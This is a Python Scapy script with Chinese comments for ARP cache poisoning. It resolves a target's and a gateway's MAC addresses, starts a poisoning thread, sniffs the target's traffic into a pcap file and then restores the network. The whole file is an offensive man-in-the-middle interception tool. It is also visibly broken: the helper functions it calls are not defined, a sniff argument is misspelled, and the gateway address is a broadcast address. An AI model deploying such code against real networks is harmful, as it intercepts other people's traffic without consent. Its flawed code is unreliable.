from scapy.all import *
import os
import sys
import threading
import signal

interface = "en1"
target_ip = "192.168.0.104"     #目標ip
gateway_ip = "192.168.0.255"   #設置gateway_ip
packet_count=1000

#設定要用的介面
conf.iface = interface

#關掉輸出
conf.verb = 0

print("[*] Setting up %s " % interface) 

gateway_mac = get_mac(gateway_ip) 

if gateway_mac is None:

   print("[!!!] Failed to get gateway MAC. Exiting.")

   sys.exit(0)
    
else:
    
   print("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))

   target_mac = get_mac(target_ip)

   if target_mac is None:

        print("[!!!] Failed to get target MAC. Exiting.")

        sys.exit(0)
        
   else:
        
        print("[*] Target %s is at %s" % (target_ip,target_mac))

    #啟動汙染thread
   poison_thread = threading.Thread(target =poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))

   poison_thread.start()

   try:

        print("[*] Starting sniffer for %d packet" % packet_count)

        bpf_filter = "ip host %s" % target_ip

        packets = sniff(count = packet_count,filer = bpf_filter,iface=interface)

        #輸出捕抓到的封包
        wrpcap('arper.pcap',packets)

        #恢復網路
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

   except KeyboardInterrupt:

        #恢復網路
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

        sys.exit(0)

        
    
